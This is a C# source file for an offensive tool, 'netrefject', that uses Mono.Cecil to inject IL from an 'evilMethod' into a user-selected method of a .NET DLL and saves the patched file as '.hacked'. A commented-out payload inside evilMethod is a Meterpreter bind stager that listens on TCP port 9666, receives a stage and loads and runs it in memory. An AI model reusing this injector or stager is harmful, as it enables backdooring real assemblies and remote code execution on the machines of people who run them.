using System;
using System.Collections.Generic;
using System.Text;
using System.Reflection;
using System.Linq;

//Payload usings
using System.IO;
using System.Net.Sockets;

using Mono.Cecil;
using Mono.Cecil.Cil;

namespace netrefject
{
    class Worker
    {
        Assembly a = null;

        public static void syntax()
        {
            Console.WriteLine("Please provide full path to a dll");
        }

        public void HandleInjectionFlow(string filename)
        {
            MethodInfo injectMethod = findInjectionMethod(filename);

            if (injectMethod == null) return;

            //bool injected = injectBadStuff(injectMethod);
            bool injected = false;

            if (injected)
            {
                Console.WriteLine("[SUCCESS]");
            }
            else
                Console.WriteLine("[FAILURE]");
        }

        #region method enum
        private MethodInfo findInjectionMethod(string filename)
        {
            MethodInfo mi = null;

            try
            {
                Assembly origAssy = Assembly.LoadFrom(filename);

                Console.WriteLine("[+] Loading modules");

                Dictionary<int, Module> internalModules = new Dictionary<int, Module>();
                int counter = 1;

                //Enumerate modules
                foreach (Module m in origAssy.GetLoadedModules())
                {
                    internalModules.Add(counter, m);
                    Console.WriteLine("[*] " + counter.ToString() + " " + m.Name);
                    counter++;
                }

                int moduleNumber = -1;
                //User chooses module
                while (!internalModules.ContainsKey(moduleNumber)) {
                    moduleNumber = chooseNumber("Please choose module number for type enumeration");
                }

                Console.WriteLine("[*] Enumerating Module " + internalModules[moduleNumber].FullyQualifiedName);

                Dictionary<int, Type> internalModuleTypes = new Dictionary<int, Type>();
                counter = 1;

                //Enumerate Types on chosen module
                foreach (Type t in internalModules[moduleNumber].GetTypes())
                {
                    internalModuleTypes.Add(counter, t);
                    Console.WriteLine("[*] " + counter.ToString() + " " + t.Name);
                    counter++;
                }

                int classNumber = -1;
                //User chooses type
                while (!internalModuleTypes.ContainsKey(classNumber))
                {
                    classNumber = chooseNumber("Please choose type number for method enumeration");
                }

                Console.WriteLine("[*] Enumerating Type " + internalModuleTypes[classNumber].FullName);

                Dictionary<int, MethodInfo> internalMethods = new Dictionary<int, MethodInfo>();
                counter = 1;

                //Enumerate Methods
                foreach(MethodInfo imi in internalModuleTypes[classNumber].GetRuntimeMethods())
                {
                    internalMethods.Add(counter, imi);
                    Console.WriteLine("[*] " + counter.ToString() + " " + imi.Name);
                    counter++;
                    foreach (ParameterInfo pi in imi.GetParameters())
                    {
                        Console.WriteLine("[*]\t" + pi.Name + ":" + pi.ParameterType.FullName);
                    }
                }

                int methodNumber = -1;
                while (!internalMethods.ContainsKey(methodNumber))
                {
                    methodNumber = chooseNumber("Please choose method number for injection");
                }

                Console.WriteLine("[!!] Will try inject payload into:");
                Console.WriteLine("\tModule:" + internalModules[moduleNumber].FullyQualifiedName);
                Console.WriteLine("\tClass:" + internalModuleTypes[classNumber].FullName);
                Console.WriteLine("\tMethod:" + internalMethods[methodNumber].Name);

                injectBadStuff(internalModules[moduleNumber], internalModuleTypes[classNumber], internalMethods[methodNumber]);
            }
            catch(Exception e)
            {
                Console.WriteLine(e.Message + ":" + e.StackTrace);
            }

            return mi;
        }

        private int chooseNumber(string question)
        {
            string numberInput = "";
            int number;

            while (!int.TryParse(numberInput, out number))
            {
                Console.Write("[?] " + question + ":");
                numberInput = Console.ReadLine();
            }

            return number;
        }
        #endregion


        /// <summary>
        /// Cecil code with thanks from Hopeless
        /// https://stackoverflow.com/questions/46052447/replace-methods-body-with-body-of-another-method-using-mono-cecil
        /// Also
        /// https://stackoverflow.com/questions/24852885/mono-cecil-add-class-with-method-into-assembly
        /// </summary>
        /// <param name="moduleT"></param>
        /// <param name="classT"></param>
        /// <param name="methodT"></param>
        /// <returns></returns>
        private bool injectBadStuff(Module moduleT, Type classT, MethodInfo methodT)
        {

            AssemblyDefinition targetAsm = AssemblyDefinition.ReadAssembly(moduleT.Assembly.Location);
            TypeDefinition targetType = targetAsm.MainModule.Types.FirstOrDefault(e => e.Name == classT.Name);
            MethodDefinition m1 = targetType.Methods.FirstOrDefault(x => x.Name == methodT.Name);

            Console.WriteLine("Instructions Before:" + m1.Body.Instructions.Count.ToString());

            ILProcessor ilp = m1.Body.GetILProcessor();
            int originaInstructionCount = m1.Body.Instructions.Count;

            //importEvilMethodClasses(m1);
            m1.Module.Import(typeof(Console).GetMethod("WriteLine",new[] {typeof(string)}));
            
            for (int i = 0; i < originaInstructionCount; i++)
            {
                if (m1.Body.Instructions[i].OpCode == OpCodes.Ret)
                {
                    Instruction retCall = m1.Body.Instructions[i];
                    int instructionCounter = 0;
                    Instruction[] instructions = getEvilInstructions();
                    for (int iI = 0;iI<instructions.Length;iI++)
                    //foreach (Instruction ei in getEvilInstructions())
                    {
                        if (instructions[iI].OpCode.Code != Code.Ret)
                        {
                            ilp.InsertBefore(retCall,instructions[iI]);
                        }
                    }
                }
            }

            Console.WriteLine("Instructions After:" + m1.Body.Instructions.Count.ToString());

            //finally write to another output assembly
            targetAsm.Write(moduleT.Assembly.FullName + ".hacked");

            return true;
        }

        private Instruction[] getEvilInstructions()
        {
            AssemblyDefinition sourceAsm = AssemblyDefinition.ReadAssembly(Assembly.GetExecutingAssembly().Location);
            TypeDefinition targetType = sourceAsm.MainModule.Types.FirstOrDefault(e => e.Name == "Worker");
            MethodDefinition m1 = targetType.Methods.FirstOrDefault(x => x.Name == "evilMethod");
            Console.WriteLine("Evil Instruction Count:" + m1.Body.Instructions.Count.ToString());
            return m1.Body.Instructions.ToArray();
        }

        private void importEvilMethodClasses(MethodDefinition m1){
            //Mui Importante: Import all your function references for your evilMethod here
            m1.Module.Import(typeof(Console).GetMethod("WriteLine",new[] {typeof(string)}));

            //TcpListener Constructor
            m1.Module.Import(typeof(TcpListener).GetConstructor(
                new[] {
                    typeof(System.Net.IPAddress),  
                    typeof(int)
                })
            );
            //TcpListener.Start 
            m1.Module.Import(typeof(TcpListener).GetMethod("Start",new[]{typeof(int)}));
            //TcpListener.AcceptTcpClient
            m1.Module.Import(typeof(TcpListener).GetMethod("AcceptTcpClient"));
            //TcpListener.Stop
            m1.Module.Import(typeof(TcpListener).GetMethod("Stop"));

            //TcpClient.GetStream
            m1.Module.Import(typeof(TcpClient).GetMethod("GetStream"));

            //BinaryReader Constructor (NetworkStream)
            m1.Module.Import(typeof(BinaryReader).GetConstructor(
                new []{
                    typeof(NetworkStream)
                })
            );

            //BinaryReader Constructor (MemoryStream)
            m1.Module.Import(typeof(BinaryReader).GetConstructor(
                new []{
                    typeof(MemoryStream)
                })
            );            

            //BinaryReader.ReadInt32
            m1.Module.Import(typeof(BinaryReader).GetMethod("ReadInt32"));

            //BinaryReader.ReadBytes
            m1.Module.Import(typeof(BinaryReader).GetMethod("ReadBytes",new []{typeof(int)}));

            //Stream.Seek (BinaryReader.BaseStream.Seek)
            m1.Module.Import(typeof(Stream).GetMethod("Seek",
                new []{
                    typeof(int),
                    typeof(SeekOrigin)
                }
            ));
            
            //MemoryStream Constructor
            m1.Module.Import(typeof(MemoryStream).GetConstructor(
                new[] {
                    typeof(byte[])
                }
            ));

            //Assembly.Load
            m1.Module.Import(typeof(Assembly).GetMethod("Load",new []{typeof(byte[])}));
            //Assembly.GetType
            m1.Module.Import(typeof(Assembly).GetMethod("GetType",new []{typeof(string)}));

            //Type.InvokeMember
            m1.Module.Import(typeof(Type).GetMethod("InvokeMember",
                new[]{
                    typeof(string),
                    typeof(BindingFlags),
                    typeof(Binder),
                    typeof(Object),
                    typeof(Object[])
                }
            ));
        }
        private void evilMethod()
        {
            //Console.WriteLine("[!!] I am evilMethod starting");
            
            var hello = "hello";

            //Meterpreter testing code taken from 
            //https://github.com/OJ/clr-meterpreter
            /*
            var port = 9666;
            var tcpListener = new TcpListener(System.Net.IPAddress.Any, port);
            tcpListener.Start(1);

            var tcpClient = tcpListener.AcceptTcpClient();
            if (tcpClient != null && tcpClient.Connected)
            {
                tcpListener.Stop();
                using (var s = tcpClient.GetStream())
                using (var r = new BinaryReader(s))
                {
                    var fullStageSize = r.ReadInt32();
                    var fullStage = r.ReadBytes(fullStageSize);
                    
                    #region LoadStage
                    var bytes = fullStage;
                    object client = tcpClient;

                    using (var memStream = new MemoryStream(bytes))
                    using (var memReader = new BinaryReader(memStream))
                    {
                        // skip over the MZ header
                        memReader.ReadBytes(2);
                        // read in the length of metsrv
                        var metSrvSize = memReader.ReadInt32();
                        // Point the reader to the configuration
                        memReader.BaseStream.Seek(metSrvSize, SeekOrigin.Begin);

                        var assembly = Assembly.Load(bytes);
                        var type = assembly.GetType("Met.Core.Server");
                        try
                        {
                            type.InvokeMember("Bootstrap", BindingFlags.Public | BindingFlags.Static | BindingFlags.InvokeMethod,
                                null, null, new object[] { memReader, client });
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine(e.Message);
                            //System.Diagnostics.Debugger.Break();
                        }
                    }
                    #endregion
                }
            }*/        

            //Console.WriteLine("[!!] I am evilMethod ending");
        }
    }
}
